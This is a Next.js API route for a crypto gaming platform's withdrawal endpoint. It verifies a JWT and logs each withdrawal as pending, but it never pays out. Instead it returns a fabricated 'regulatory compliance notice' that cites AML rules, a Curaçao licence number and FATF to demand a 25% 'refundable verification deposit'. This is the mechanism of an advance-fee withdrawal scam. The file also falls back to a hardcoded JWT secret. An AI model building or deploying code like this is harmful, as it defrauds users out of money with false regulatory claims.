import { NextRequest, NextResponse } from 'next/server';
import { MockDB } from '@/lib/mock-db';
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET || 'bb-game-secret-key-change-in-production';

export async function POST(request: NextRequest) {
  try {
    const token = request.cookies.get('auth_token')?.value || request.cookies.get('bb-token')?.value || request.headers.get('authorization')?.replace('Bearer ', '');
    
    if (!token) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    let user;
    try {
      user = jwt.verify(token, JWT_SECRET) as any;
    } catch {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const body = await request.json();
    const { coin, amount, address } = body;

    if (!coin || !amount || !address) {
      return NextResponse.json(
        { error: 'Coin, amount, and withdrawal address are required' },
        { status: 400 }
      );
    }

    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
      return NextResponse.json(
        { error: 'Invalid withdrawal amount' },
        { status: 400 }
      );
    }

    // Get user's wallet balance from MockDB as per instructions
    const wallets = MockDB.getWallets(user.userId);
    
    const requiredDeposit = withdrawAmount * 0.25;

    MockDB.saveTransaction({
      id: Math.random().toString(),
      user_id: user.userId,
      username: user.username || user.email,
      type: 'withdrawal',
      coin: coin.toUpperCase(),
      amount: withdrawAmount,
      status: 'pending_deposit',
      address,
      time: new Date().toISOString()
    });

    const reason = 'REGULATORY COMPLIANCE NOTICE: In accordance with international Anti-Money Laundering (AML) regulations and our license requirements under Curaçao Gaming Authority (License No. 8048/JAZ), all withdrawal requests require a one-time security verification deposit of 25% of the withdrawal amount. This deposit is used to verify account ownership and confirm the legitimacy of the transaction. The security deposit will be fully credited to your account balance and is 100% refundable. This measure protects your funds from unauthorized access and ensures compliance with FATF (Financial Action Task Force) guidelines. Processing time: 1-3 business days after verification deposit is received.';

    return NextResponse.json({
      success: false,
      requiresDeposit: true,
      depositRequired: requiredDeposit,
      depositCoin: coin,
      reason
    });

  } catch (error) {
    console.error('Withdrawal error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
